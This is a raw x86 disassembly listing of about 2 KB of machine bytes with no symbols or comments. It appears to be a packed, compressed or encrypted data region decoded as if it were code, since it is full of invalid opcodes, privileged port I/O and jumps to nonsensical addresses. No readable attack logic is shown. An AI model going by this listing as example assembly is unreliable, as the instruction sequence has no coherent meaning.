  408afb:	mov    esi,0xe7f5b950
  408b00:	or     al,0x57
  408b02:	add    BYTE PTR [eax],al
  408b04:	mov    esi,0x2c086c
  408b09:	add    BYTE PTR [edx+0x27154b22],bh
  408b0f:	ror    edx,cl
  408b11:	xor    eax,0x504c
  408b16:	rcl    bl,1
  408b18:	dec    esi
  408b19:	dec    esp
  408b1a:	pop    ds
  408b1b:	add    BYTE PTR [eax],al
  408b1d:	and    BYTE PTR [ecx-0x9],bl
  408b20:	pop    ebx
  408b21:	cwde   
  408b22:	mov    esp,0xfc95252d
  408b27:	fwait
  408b28:	inc    edi
  408b29:	push   edx
  408b2a:	mov    ebx,0x3086e4a7
  408b2f:	loope  0x408baf
  408b31:	cmc    
  408b32:	xor    ah,BYTE PTR [ecx-0x7e]
  408b35:	lods   eax,DWORD PTR ds:[esi]
  408b36:	test   BYTE PTR ds:0xf63d0000,bh
  408b3c:	stc    
  408b3d:	mov    WORD PTR [edx],ss
  408b3f:	add    BYTE PTR [eax],al
  408b41:	in     eax,0xcf
  408b43:	dec    edi
  408b44:	bound  esp,QWORD PTR [eax]
  408b46:	lods   al,BYTE PTR ds:[esi]
  408b47:	popf   
  408b48:	mov    ebp,0xb848
  408b4d:	mov    cl,0x31
  408b4f:	enter  0xab,0x0
  408b53:	sar    BYTE PTR [ebx-0x56fc0000],0x0
  408b5a:	add    BYTE PTR [ebx+0x54],dl
  408b5d:	xchg   edx,eax
  408b5e:	inc    ebp
  408b5f:	arpl   sp,si
  408b61:	in     al,dx
  408b62:	ja     0x408b58
  408b64:	mov    cl,0xca
  408b66:	mov    eax,0xeeb6ee94
  408b6b:	jp     0x408aef
  408b6d:	inc    ebx
  408b6e:	sahf   
  408b6f:	nop
  408b70:	int    0xc8
  408b72:	jnp    0x408b74
  408b74:	add    bh,bh
  408b76:	das    
  408b77:	jmp    0xa7ed:0x961c8bdb
  408b7e:	jnp    0x408bc3
  408b80:	mov    eax,0x6eb5b1cb
  408b85:	dec    eax
  408b86:	pop    edi
  408b87:	add    BYTE PTR [eax],al
  408b89:	out    dx,al
  408b8a:	jmp    0x3a1e4cf5
  408b8f:	jae    0x408b61
  408b91:	lods   al,BYTE PTR ds:[si]
  408b93:	push   esi
  408b94:	pop    ecx
  408b95:	dec    eax
  408b96:	inc    eax
  408b97:	add    BYTE PTR [eax],al
  408b99:	push   edi
  408b9a:	iret   
  408b9b:	ret    
  408b9c:	ret    
  408b9d:	call   0x31fc708e
  408ba2:	xchg   edi,eax
  408ba3:	(bad)  
  408ba4:	xor    esi,DWORD PTR [eax]
  408ba6:	iret   
  408ba7:	stos   BYTE PTR es:[edi],al
  408ba8:	mov    es,WORD PTR [edx-0x57]
  408bab:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  408bad:	mov    ch,0x5a
  408baf:	retf   
  408bb0:	cs mov ecx,0x9a5ee7b2
  408bb6:	mov    dl,0x3a
  408bb8:	and    BYTE PTR [ebx-0x2163522e],cl
  408bbe:	jnp    0x408b9b
  408bc0:	mov    edi,0x555bbdad
  408bc5:	out    0x0,al
  408bc7:	or     eax,DWORD PTR [eax]
  408bc9:	add    dl,ah
  408bcb:	jecxz  0x408c06
  408bcd:	stos   DWORD PTR es:[edi],eax
  408bce:	pop    es
  408bcf:	repz mov WORD PTR cs:[edi],ds
  408bd3:	add    BYTE PTR [eax],al
  408bd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bd8:	test   BYTE PTR [ebp+0x0],dl
  408bdb:	add    BYTE PTR [edi+0x7e],ch
  408bde:	inc    esp
  408bdf:	cdq    
  408be0:	add    BYTE PTR [eax],al
  408be2:	aad    0xf4
  408be4:	out    0x12,eax
  408be6:	dec    edx
  408be7:	dec    eax
  408be8:	pop    ebp
  408be9:	add    BYTE PTR [eax],al
  408beb:	aad    0xc3
  408bed:	clc    
  408bee:	and    eax,0x10f94b21
  408bf3:	xor    al,0x79
  408bf5:	int    0x72
  408bf7:	lods   al,BYTE PTR ds:[esi]
  408bf8:	jmp    0xdc640826
  408bfd:	ins    BYTE PTR es:[edi],dx
  408bfe:	retf   0xc7f1
  408c01:	pushf  
  408c02:	(bad)  
  408c03:	fdiv   DWORD PTR [edi-0x4bbdf4c6]
  408c09:	shl    BYTE PTR [eax+0x1a],1
  408c0c:	inc    ebx
  408c0d:	xor    BYTE PTR [esi],bl
  408c0f:	dec    esi
  408c10:	jbe    0x408c54
  408c12:	out    dx,eax
  408c13:	cmp    DWORD PTR [ecx+0x3],esi
  408c16:	std    
  408c17:	xor    eax,0x13207471
  408c1c:	stc    
  408c1d:	mov    bh,0x35
  408c1f:	js     0x408c22
  408c21:	neg    BYTE PTR [eax+0x3e]
  408c24:	jmp    0x408c82
  408c26:	push   0xa2195032
  408c2b:	push   ebx
  408c2c:	cmc    
  408c2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c2e:	push   ds
  408c2f:	push   ebx
  408c30:	cmp    BYTE PTR [esi],dl
  408c32:	data16 mov dl,BYTE PTR [ecx+0x6e38aea1]
  408c39:	add    al,0x90
  408c3b:	add    BYTE PTR [eax],al
  408c3d:	and    DWORD PTR [eax],ebx
  408c3f:	ss test edx,ecx
  408c42:	mov    WORD PTR ds:0xf1190000,ss
  408c48:	es daa 
  408c4a:	and    dl,BYTE PTR [ecx]
  408c4c:	fld    QWORD PTR [edi+0x56]
  408c4f:	sbb    bh,BYTE PTR ds:0xcbd4e9f7
  408c55:	mov    BYTE PTR [esi],cl
  408c57:	add    BYTE PTR [eax],al
  408c59:	dec    edx
  408c5a:	imul   esp,ebx,0x2e
  408c5d:	dec    eax
  408c5e:	in     al,0x0
  408c60:	add    BYTE PTR [edi],dl
  408c62:	into   
  408c63:	sbb    bh,BYTE PTR [edx]
  408c65:	aaa    
  408c66:	jge    0x408c07
  408c68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c69:	int    0xc7
  408c6b:	mov    ds:0x5cbb77cd,al
  408c70:	mov    al,0xff
  408c72:	jbe    0x408c36
  408c74:	not    BYTE PTR [eax+eax*8-0x21ffff28]
  408c7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c7c:	mov    esi,DWORD PTR [ecx-0x6fa51504]
  408c82:	xchg   ebp,eax
  408c83:	push   ds
  408c84:	add    al,0xc0
  408c86:	add    BYTE PTR [eax],al
  408c88:	push   eax
  408c89:	nop
  408c8a:	jne    0x408cbe
  408c8c:	neg    DWORD PTR [esi+esi*2+0x1fdf98cb]
  408c93:	stos   BYTE PTR es:[edi],al
  408c94:	cs in  eax,0xb6
  408c97:	imul   ebp,esi,0xcf329a6e
  408c9d:	pushf  
  408c9e:	lea    esi,[esi]
  408ca0:	or     BYTE PTR [eax-0x43],0x0
  408ca4:	add    BYTE PTR ds:0x484cc5bb,cl
  408caa:	add    BYTE PTR [eax],al
  408cac:	sbb    ah,ch
  408cae:	out    0x49,eax
  408cb0:	scas   eax,DWORD PTR es:[edi]
  408cb1:	xchg   edi,eax
  408cb2:	push   esi
  408cb3:	mov    dh,0xc4
  408cb5:	pop    ds
  408cb6:	add    BYTE PTR [eax],al
  408cb8:	push   edi
  408cb9:	scas   eax,DWORD PTR es:[edi]
  408cba:	sar    BYTE PTR [edi-0x23],cl
  408cbd:	out    0xe7,eax
  408cbf:	aas    
  408cc0:	out    dx,al
  408cc1:	push   0x33
  408cc3:	shr    DWORD PTR [edi+0x28],0xcf
  408cc7:	scas   al,BYTE PTR es:[edi]
  408cc8:	cmp    BYTE PTR [ebx+0x0],0x0
  408ccc:	sbb    al,0x87
  408cce:	frstorw [edx+0x3504bd]
  408cd5:	add    BYTE PTR [ecx],bl
  408cd7:	imul   edx,DWORD PTR [ecx-0x500498b2],0x2c5ed58
  408ce1:	lahf   
  408ce2:	pop    edi
  408ce3:	pop    esp
  408ce4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ce5:	or     ch,BYTE PTR [ecx+ebp*8+0x36]
  408ce9:	jmp    0x408d4a
  408ceb:	adc    al,BYTE PTR [ebp-0x23]
  408cee:	ret    
  408cef:	imul   edi,edx,0xffffffdf
  408cf2:	fsubr  DWORD PTR [esi-0x43]
  408cf5:	scas   eax,DWORD PTR es:[edi]
  408cf6:	jl     0x408cfd
  408cf8:	rcl    edx,1
  408cfa:	cmc    
  408cfb:	inc    esi
  408cfc:	es pop es
  408cfe:	dec    esi
  408cff:	lea    edi,[ebx-0xa]
  408d02:	nop
  408d03:	or     DWORD PTR [edx-0x56],0xbaaa2cd
  408d0a:	sbb    eax,esi
  408d0c:	mov    al,0xf6
  408d0e:	jp     0x408d18
  408d10:	add    BYTE PTR es:[eax],al
  408d13:	ficom  WORD PTR cs:[edx]
  408d16:	ret    
  408d17:	adc    eax,0x1aa07e26
  408d1c:	fild   WORD PTR [esi+eiz*8]
  408d1f:	add    BYTE PTR [eax],al
  408d21:	push   ebp
  408d22:	pop    es
  408d23:	popa   
  408d24:	jne    0x408ce8
  408d26:	xchg   BYTE PTR [esp+edx*2+0x3bdc13e9],ah
  408d2d:	test   al,0xec
  408d2f:	push   edx
  408d30:	fcmovbe st,st(4)
  408d32:	jg     0x408ce6
  408d34:	xchg   edx,eax
  408d35:	ret    0x83b6
  408d38:	mov    cs,WORD PTR [ecx]
  408d3a:	mov    bh,0x48
  408d3c:	push   ds
  408d3d:	add    BYTE PTR [eax],al
  408d3f:	ins    BYTE PTR es:[edi],dx
  408d40:	pop    eax
  408d41:	add    ebp,edx
  408d43:	ins    BYTE PTR es:[edi],dx
  408d44:	aad    0x52
  408d46:	dec    edi
  408d47:	mov    al,0xb
  408d49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d4a:	jmp    0x417d1925
  408d4f:	xor    bh,dl
  408d51:	adc    al,0xf7
  408d53:	dec    edx
  408d54:	and    ebp,ebx
  408d56:	jb     0x408dcd
  408d58:	gs push esp
  408d5a:	es mov bl,0x68
  408d5d:	ja     0x408da4
  408d5f:	xchg   esp,eax
  408d60:	or     eax,0x6676a826
  408d65:	xchg   esi,eax
  408d66:	xor    edi,esp
  408d68:	imul   edx,DWORD PTR [esi-0x15],0xd32d383e
  408d6f:	popa   
  408d70:	jecxz  0x408df0
  408d72:	pop    esi
  408d73:	xor    ecx,edx
  408d75:	dec    ebx
  408d76:	les    edx,FWORD PTR [esi+0x0]
  408d79:	add    BYTE PTR [eax-0x78d52c46],dh
  408d7f:	hlt    
  408d80:	mov    ebp,0x6d6afdbc
  408d85:	(bad)  
  408d86:	xchg   esi,eax
  408d87:	mov    al,0xb4
  408d89:	and    BYTE PTR [edx],ah
  408d8b:	adc    DWORD PTR [esi],eax
  408d8d:	or     edi,DWORD PTR [edx-0x1b]
  408d90:	dec    esi
  408d91:	test   eax,0xdc4c
  408d96:	xchg   edx,eax
  408d97:	leave  
  408d98:	mov    dl,0xf2
  408d9a:	jbe    0x408d4f
  408d9c:	jge    0x408dd9
  408d9e:	sub    edi,DWORD PTR [ebp-0x29]
  408da1:	dec    ecx
  408da2:	xchg   ecx,eax
  408da3:	ds fs popf 
  408da6:	xor    eax,DWORD PTR [eax]
  408da8:	jg     0x408daa
  408daa:	add    ch,bl
  408dac:	mov    edx,0x1e80
  408db1:	das    
  408db2:	inc    edi
  408db3:	pop    eax
  408db4:	lock test eax,0x67c0
  408dba:	mov    al,BYTE PTR [bx+di+0x7c]
  408dbe:	fnstenv [edx]
  408dc0:	inc    esp
  408dc1:	nop
  408dc2:	add    BYTE PTR [eax],al
  408dc4:	and    dh,dh
  408dc6:	mov    edx,0x1f9c6b4b
  408dcb:	cdq    
  408dcc:	mov    ecx,0x4ecd5db1
  408dd1:	pop    edx
  408dd2:	mov    eax,ss
  408dd4:	add    BYTE PTR [eax],al
  408dd6:	loope  0x408e31
  408dd8:	mov    dh,0x52
  408dda:	cmp    BYTE PTR [esi],al
  408ddc:	mov    DWORD PTR [eax+0x63],esp
  408ddf:	int    0x45
  408de1:	xor    DWORD PTR [ebx+0x2f6bbc97],0x537eb8eb
  408deb:	add    al,0xb6
  408ded:	add    BYTE PTR [eax],al
  408def:	xor    bl,0xfb
  408df2:	xor    bl,BYTE PTR [eax]
  408df4:	xacquire xchg DWORD PTR [edi],ebx
  408df7:	mov    cl,0x58
  408df9:	aas    
  408dfa:	adc    BYTE PTR [ebx+eiz*8],bl
  408dfd:	xchg   esi,eax
  408dfe:	ins    DWORD PTR es:[edi],dx
  408dff:	pop    edx
  408e00:	les    edi,FWORD PTR [eax+0x0]
  408e03:	add    BYTE PTR [edx+0x4f8eae13],bl
  408e09:	cdq    
  408e0a:	outs   dx,DWORD PTR ds:[esi]
  408e0b:	aaa    
  408e0c:	jmp    0x6725c80d
  408e11:	mov    cl,0xe6
  408e13:	sub    ah,BYTE PTR [ecx]
  408e15:	add    dh,BYTE PTR [ecx-0x61]
  408e18:	xchg   ebx,eax
  408e19:	les    eax,FWORD PTR [edx+0x48000000]
  408e1f:	add    BYTE PTR [eax],al
  408e21:	lods   al,BYTE PTR ds:[esi]
  408e22:	out    0xa6,eax
  408e24:	cmp    BYTE PTR [ecx-0x18],ch
  408e27:	or     ecx,DWORD PTR [ebx]
  408e29:	gs retf 0x64e2
  408e2d:	out    0x9a,eax
  408e2f:	xchg   ecx,eax
  408e30:	call   0xea1ea70b
  408e35:	xchg   ecx,eax
  408e36:	lods   al,BYTE PTR ds:[esi]
  408e37:	pop    ebx
  408e38:	imul   edx,DWORD PTR [ebx],0x76b8b07d
  408e3e:	test   eax,0x6ae1e074
  408e43:	pop    esi
  408e44:	popf   
  408e45:	jne    0x408ea7
  408e47:	(bad)  
  408e48:	in     al,dx
  408e49:	icebp  
  408e4a:	cmc    
  408e4b:	(bad)  
  408e4c:	add    al,0x5c
  408e4e:	add    BYTE PTR [eax],al
  408e50:	aam    0x9
  408e52:	test   DWORD PTR [ecx+0x68],esp
  408e55:	ss jae 0x408ec8
  408e58:	mov    al,0x7
  408e5a:	jge    0x408e9d
  408e5c:	ins    DWORD PTR es:[edi],dx
  408e5d:	adc    BYTE PTR [ecx-0x2e0f53ae],bl
  408e63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e64:	sbb    al,0x65
  408e66:	or     eax,0x9087de26
  408e6b:	inc    ecx
  408e6c:	add    ah,BYTE PTR [edi+0x416e5921]
  408e72:	mov    esp,0x9692cbd2
  408e77:	add    edx,DWORD PTR [edx+0x76]
  408e7a:	or     DWORD PTR [edi-0x4baad98],esp
  408e80:	push   ebp
  408e81:	std    
  408e82:	outs   dx,BYTE PTR ds:[esi]
  408e83:	xchg   ebx,eax
  408e84:	mov    esp,0xfa88
  408e89:	fldenv [ebx]
  408e8b:	hlt    
  408e8c:	lock mov ah,0x88
  408e8f:	xchg   ebx,eax
  408e90:	add    BYTE PTR [eax],al
  408e92:	and    DWORD PTR [ebx+0x2],0xeec61264
  408e99:	pop    ebp
  408e9a:	xor    al,0x13
  408e9c:	out    dx,eax
  408e9d:	sub    eax,0x7507f746
  408ea2:	and    BYTE PTR [ecx],0x0
  408ea5:	add    BYTE PTR [esi],dh
  408ea7:	shl    BYTE PTR [edx+0x0],0x0
  408eab:	pop    edi
  408eac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ead:	cmp    al,0x7f
  408eaf:	popf   
  408eb0:	pop    eax
  408eb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408eb2:	pop    edx
  408eb3:	sbb    dl,bh
  408eb5:	dec    ebx
  408eb6:	jge    0x408f31
  408eb8:	ret    
  408eb9:	cmp    eax,0xfa3ee949
  408ebe:	scas   eax,DWORD PTR es:[edi]
  408ebf:	jb     0x408e4a
  408ec1:	inc    ebx
  408ec2:	pop    es
  408ec3:	cdq    
  408ec4:	mov    DWORD PTR [ebp+0x9c48c1],ebx
  408eca:	add    BYTE PTR [ebp-0x4c],dl
  408ecd:	out    0x12,eax
  408ecf:	mov    dh,0x94
  408ed1:	and    al,0x30
  408ed3:	mov    eax,0x1404
  408ed8:	pop    ebx
  408ed9:	xchg   ebx,eax
  408eda:	mov    bl,0x5c
  408edc:	out    dx,eax
  408edd:	pop    ss
  408ede:	mov    edi,0x69dd9c61
  408ee3:	push   0x5ea1acd2
  408ee8:	xor    ch,ch
  408eea:	cdq    
  408eeb:	adc    edx,esp
  408eed:	add    eax,0x50337cdf
  408ef2:	in     eax,dx
  408ef3:	cli    
  408ef4:	clc    
  408ef5:	fwait
  408ef6:	dec    esp
  408ef7:	xlat   BYTE PTR ds:[ebx]
  408ef8:	add    BYTE PTR [eax],al
  408efa:	test   al,0x31
  408efc:	arpl   bx,dx
  408efe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408eff:	sar    BYTE PTR [esi+0xeae86e6],cl
  408f05:	or     ecx,DWORD PTR [ebp-0x30]
  408f08:	aas    
  408f09:	xchg   esi,eax
  408f0a:	inc    eax
  408f0b:	jmp    0x408f0d
  408f0d:	add    BYTE PTR [edi+eiz*2+0x7ba20000],al
  408f14:	and    eax,0x92d93af3
  408f19:	loopne 0x408f77
  408f1b:	into   
  408f1c:	sbb    al,0x9e
  408f1e:	jae    0x408f84
  408f20:	(bad)  
  408f21:	cmp    dl,BYTE PTR [edx-0x152cfc91]
  408f27:	out    0xf4,eax
  408f29:	add    eax,0x5506dea9
  408f2e:	sbb    eax,0xd304eb0e
  408f33:	add    BYTE PTR [eax],al
  408f35:	imul   ebx,DWORD PTR [esi-0x1d8f060d],0x6c9577c1
  408f3f:	imul   BYTE PTR [ecx]
  408f41:	(bad)  
  408f42:	into   
  408f43:	scas   al,BYTE PTR es:[edi]
  408f44:	jmp    DWORD PTR [ebp+0x7e]
  408f47:	or     bh,ah
  408f49:	add    BYTE PTR [eax],al
  408f4b:	stos   BYTE PTR es:[edi],al
  408f4c:	jmp    0xbf21:0x569afe23
  408f53:	in     eax,0x48
  408f55:	adc    BYTE PTR [eax],al
  408f57:	add    ah,bh
  408f59:	dec    ebp
  408f5a:	ins    BYTE PTR es:[edi],dx
  408f5b:	adc    al,0x88
  408f5d:	sbb    al,0x0
  408f5f:	add    cl,dl
  408f61:	jp     0x408fa5
  408f63:	(bad)  
  408f64:	xchg   ecx,eax
  408f65:	jae    0x408fe4
  408f67:	add    eax,0xcc3bc5a2
  408f6c:	arpl   WORD PTR [eax],ax
  408f6e:	add    BYTE PTR [edi-0x40b2c171],cl
  408f74:	xchg   edi,eax
  408f75:	pop    ecx
  408f76:	mov    dl,0x11
  408f78:	fwait
  408f79:	jb     0x408f06
  408f7b:	lods   eax,DWORD PTR ds:[esi]
  408f7c:	mov    dh,0xe4
  408f7e:	inc    ebx
  408f7f:	(bad)  
  408f80:	mov    eax,ds:0xcc848daa
  408f85:	add    BYTE PTR [eax],al
  408f87:	pop    edi
  408f88:	test   al,0xed
  408f8a:	and    esp,DWORD PTR [edx]
  408f8c:	and    DWORD PTR [ecx+ecx*8+0x64c11552],0xffffffa2
  408f94:	sub    al,0x92
  408f96:	cmp    DWORD PTR [ecx-0x26300494],edi
  408f9c:	xchg   ecx,eax
  408f9d:	fs xchg esp,eax
  408f9f:	dec    ebx
  408fa0:	xor    DWORD PTR [ebx-0x4baf1983],eax
  408fa6:	sbb    BYTE PTR [edx+0x6b],dh
  408fa9:	jnp    0x408f31
  408fab:	mov    ss,WORD PTR [eax+0x2ae1ddb1]
  408fb1:	and    DWORD PTR [ebp-0x12],ebx
  408fb4:	in     al,dx
  408fb5:	mov    bl,0xfe
  408fb7:	fst    QWORD PTR [esi-0x65]
  408fba:	scas   eax,DWORD PTR es:[edi]
  408fbb:	jns    0x408f8e
  408fbd:	test   BYTE PTR [ebx+0x0],dl
  408fc0:	add    BYTE PTR ds:0x18455f24,bl
  408fc6:	js     0x408f99
  408fc8:	xchg   DWORD PTR [eax-0x32b367aa],esi
  408fce:	add    BYTE PTR [eax],al
  408fd0:	clc    
  408fd1:	imul   ebp,DWORD PTR [ebp-0x3a0dafaa],0x6f
  408fd8:	(bad)  
  408fd9:	push   0x8c1db875
  408fde:	stos   BYTE PTR es:[edi],al
  408fdf:	add    BYTE PTR [eax],al
  408fe1:	or     BYTE PTR [eax+0x1a000036],0xa5
  408fe8:	pop    eax
  408fe9:	add    cl,BYTE PTR [ebx+eax*2-0x3ec90000]
  408ff0:	sub    DWORD PTR [esi],ebp
  408ff2:	inc    eax
  408ff3:	mov    edx,0x24950000
  408ff8:	(bad)  
  408ff9:	pop    ss
  408ffa:	push   es
  408ffb:	fs das 
  408ffd:	into   
  408ffe:	jmp    0xed75:0xde90add7
  409005:	sub    esp,edx
  409007:	add    DWORD PTR ds:0xcc90592a,0xc50000b0
  409011:	mov    bh,0xd1
  409013:	aam    0x96
  409015:	push   0x5a
  409017:	lea    edx,[ebx]
  409019:	sti    
  40901a:	cmc    
  40901b:	test   eax,0xd9966c49
  409020:	mov    ch,0xa4
  409022:	lahf   
  409023:	pop    ecx
  409024:	neg    BYTE PTR [eax+0x75]
  409027:	call   0x58c6:0xa2bdbad6
  40902e:	jge    0x40908b
  409030:	test   eax,0x168f648b
  409035:	aam    0xb3
  409037:	jns    0x40901b
  409039:	pop    ebx
  40903a:	dec    edx
  40903b:	push   0x28703b14
  409040:	sub    BYTE PTR [esi],dl
  409042:	mov    cl,0xdd
  409044:	ror    BYTE PTR [ebp-0x2ebf0000],0x59
  40904b:	adc    esi,DWORD PTR [edx-0x31dadd85]
  409051:	sub    al,0xb1
  409053:	add    dh,BYTE PTR [ebp-0x7f]
  409056:	retf   0x7bed
  409059:	ror    DWORD PTR [eax+esi*2-0x1ccb0000],1
  409060:	xchg   edi,eax
  409061:	scas   eax,DWORD PTR es:[edi]
  409062:	or     BYTE PTR [ebp+0x0],ch
  409065:	add    BYTE PTR [ebx+edi*8+0x40],ch
  409069:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40906a:	add    BYTE PTR [eax],al
  40906c:	mov    ah,0xcc
  40906e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40906f:	add    BYTE PTR [eax],al
  409071:	imul   ebp,esp,0x5a
  409074:	ds jp  0x408ffb
  409077:	xchg   ecx,eax
  409078:	add    BYTE PTR [eax],al
  40907a:	push   ss
  40907b:	(bad)  
  40907c:	stos   BYTE PTR es:[edi],al
  40907d:	pop    es
  40907e:	ins    BYTE PTR es:[edi],dx
  40907f:	je     0x40907d
  409081:	jae    0x4090a0
  409083:	cs inc eax
  409085:	sbb    BYTE PTR [eax],al
  409087:	add    bh,cl
  409089:	(bad)  
  40908a:	mov    edx,ebx
  40908c:	adc    DWORD PTR [eax-0x3b],edx
  40908f:	pop    ebx
  409090:	add    BYTE PTR ds:0x6a730000,dh
  409096:	mov    ds:0xddff258a,eax
  40909b:	cmp    al,0x4f
  40909d:	jmp    0x409107
  40909f:	xchg   ebx,eax
  4090a0:	(bad)
  4090a4:	mov    ds:0x9985753a,al
  4090a9:	dec    edx
  4090aa:	mov    eax,ds:0x1617d69
  4090af:	mov    edx,0xd95eb71b
  4090b4:	fs adc ch,cl
  4090b7:	jg     0x409085
  4090b9:	repz add BYTE PTR [eax],al
  4090bc:	cmp    BYTE PTR [edx-0x3ec585d4],ch
  4090c2:	fimul  DWORD PTR [esi+0x1d]
  4090c5:	mov    bh,0x6
  4090c7:	imul   edi,DWORD PTR [edx+edx*4],0xffffff8c
  4090cb:	add    BYTE PTR cs:[eax],al
  4090ce:	pop    ecx
  4090cf:	sub    BYTE PTR [eax],dh
  4090d1:	(bad)  
  4090d2:	(bad)  [esi+0x90815b6]
  4090d8:	add    BYTE PTR [eax],al
  4090da:	ins    BYTE PTR es:[edi],dx
  4090db:	xor    BYTE PTR [ebx+0xce48],cl
  4090e1:	jae    0x4090ac
  4090e3:	cmp    esi,edx
  4090e5:	mov    DWORD PTR [edx+0x2369497],edi
  4090eb:	jecxz  0x40909b
  4090ed:	or     ebx,DWORD PTR [eax]
  4090ef:	ins    DWORD PTR es:[edi],dx
  4090f0:	mov    esi,0x3298ec6b
  4090f5:	jo     0x409176
  4090f7:	les    esp,FWORD PTR ds:0xc8f50000
  4090fd:	aas    
  4090fe:	add    BYTE PTR [eax],al
  409100:	imul   eax,DWORD PTR [ebx+0x56],0x5f
  409104:	mov    edi,0x98d4827e
  409109:	or     DWORD PTR [ebp+0x34],esp
  40910c:	mov    dh,0x2f
  40910e:	inc    ebp
  40910f:	outs   dx,DWORD PTR ds:[esi]
  409110:	mov    ebx,DWORD PTR [edi-0x664e802b]
  409116:	mov    bl,0x16
  409118:	out    dx,al
  409119:	es es ret 
  40911c:	jae    0x4090c2
  40911e:	mov    ds:0xa6d6d37c,eax
  409123:	add    eax,0xb4df3b1e
  409128:	and    al,0xad
  40912a:	icebp  
  40912b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40912c:	popa   
  40912d:	and    BYTE PTR [ecx+0x33],dl
  409130:	xor    edi,esi
  409132:	xor    cl,BYTE PTR [edx+0x9c4c]
  409138:	mov    ds:0x261b6a1b,eax
  40913d:	and    BYTE PTR [ebx+0x2],0xc8
  409141:	fadd   DWORD PTR [eax]
  409143:	add    BYTE PTR [ecx],ch
  409145:	(bad)  
  409146:	std    
  409147:	xchg   ebp,eax
  409148:	xchg   edi,eax
  409149:	sub    bl,0x15
  40914c:	hlt    
  40914d:	xchg   BYTE PTR [eax+0x54bf5fff],dh
  409153:	sub    bh,BYTE PTR gs:[ebx]
  409156:	dec    ebx
  409157:	(bad)  
  409158:	call   0x1225564
  40915d:	add    al,cl
  40915f:	sbb    BYTE PTR [eax],al
  409161:	add    BYTE PTR [ebx-0x48],dh
  409164:	jmp    0x88102fd7
  409169:	mov    eax,0x9ec7dea9
  40916e:	ja     0x409151
  409170:	aas    
  409171:	ret    
  409172:	push   ebp
  409173:	jbe    0x4091b5
  409175:	inc    esi
  409176:	add    BYTE PTR [eax],al
  409178:	or     al,dl
  40917a:	add    BYTE PTR [eax],al
  40917c:	neg    bl
  40917e:	push   edi
  40917f:	cdq    
  409180:	ret    
  409181:	ja     0x4091c1
  409183:	cmp    ch,BYTE PTR [esi+0x6a]
  409186:	sub    al,0x44
  409188:	cmp    al,0x0
  40918a:	add    BYTE PTR [eax+0x54],ch
  40918d:	pop    esp
  40918e:	push   ecx
  40918f:	pop    edi
  409190:	loop   0x409149
  409192:	lods   eax,DWORD PTR ds:[esi]
  409193:	xchg   ecx,eax
  409194:	stos   DWORD PTR es:[edi],eax
  409195:	inc    eax
  409196:	sbb    al,BYTE PTR [eax]
  409198:	add    BYTE PTR [ecx],cl
  40919a:	ins    BYTE PTR es:[edi],dx
  40919b:	outs   dx,BYTE PTR ds:[esi]
  40919c:	(bad)  
  40919d:	scas   al,BYTE PTR es:[edi]
  40919e:	pop    esp
  40919f:	es (bad) 
  4091a3:	xchg   DWORD PTR [eax+0x6e000084],eax
  4091a9:	sti    
  4091aa:	(bad)  [ebx-0x45]
  4091ad:	pop    es
  4091ae:	mov    bl,0xc
  4091b0:	add    BYTE PTR [eax],0x0
  4091b3:	data16 sahf 
  4091b5:	push   ss
  4091b6:	push   cx
  4091b8:	fmul   st(0),st
  4091ba:	adc    DWORD PTR [eax],eax
  4091bc:	add    BYTE PTR [ecx-0x6853c147],al
  4091c2:	pop    ebx
  4091c3:	mov    ds:0xec8769f5,al
  4091c8:	add    eax,0x726f3d43
  4091cd:	retf   0x852
  4091d0:	fiadd  DWORD PTR [eax]
  4091d2:	add    BYTE PTR [ecx+eax*1-0x2c],bl
  4091d6:	loopne 0x4091c3
  4091d8:	mov    dl,0xc
  4091da:	mov    BYTE PTR [eax],al
  4091dc:	add    BYTE PTR [ecx+eax*4-0x3f2a70b3],ah
  4091e3:	into   
  4091e4:	add    BYTE PTR [eax],al
  4091e6:	xchg   DWORD PTR [edx],edi
  4091e8:	mov    esi,0x7fff4fab
  4091ed:	mov    bl,0x43
  4091ef:	jl     0x409213
  4091f1:	cs mov cl,0x35
  4091f4:	cmp    eax,0xd8a87085
  4091f9:	aad    0xb0
  4091fb:	or     al,0xaa
  4091fd:	add    BYTE PTR [eax],al
  4091ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409200:	sub    al,0x4e
  409202:	(bad)
  409205:	adc    al,0x6b
  409207:	stc    
  409208:	call   0xdf74:0x7b3bac50
  40920f:	jo     0x4091f6
  409211:	sar    dl,0x0
  409214:	add    BYTE PTR ds:0x7bd4d15c,bh
  40921a:	imul   ebp,DWORD PTR [esi-0x316b16b],0xffffffea
  409221:	dec    ebx
  409222:	xor    dh,BYTE PTR [ebp+edi*2-0x46c0c8c]
  409229:	dec    edx
  40922a:	sub    BYTE PTR [ebp-0x4fdb0a70],dl
  409230:	jbe    0x409229
  409232:	dec    esp
  409233:	add    al,BYTE PTR [eax]
  409235:	add    BYTE PTR [esi],ah
  409237:	jecxz  0x4091de
  409239:	pop    ebp
  40923a:	sbb    ch,ch
  40923c:	clc    
  40923d:	mov    dh,0x18
  40923f:	xchg   ebp,eax
  409240:	mov    al,ds:0x308c06
  409245:	add    BYTE PTR [edx],al
  409247:	xor    al,0xbc
  409249:	in     eax,dx
  40924a:	xchg   edx,eax
  40924b:	jns    0x4091db
  40924d:	in     al,dx
  40924e:	dec    edi
  40924f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409250:	in     al,dx
  409251:	push   edx
  409252:	dec    edi
  409253:	sti    
  409254:	dec    BYTE PTR [eax-0x51]
  409257:	add    BYTE PTR [eax],al
  409259:	sti    
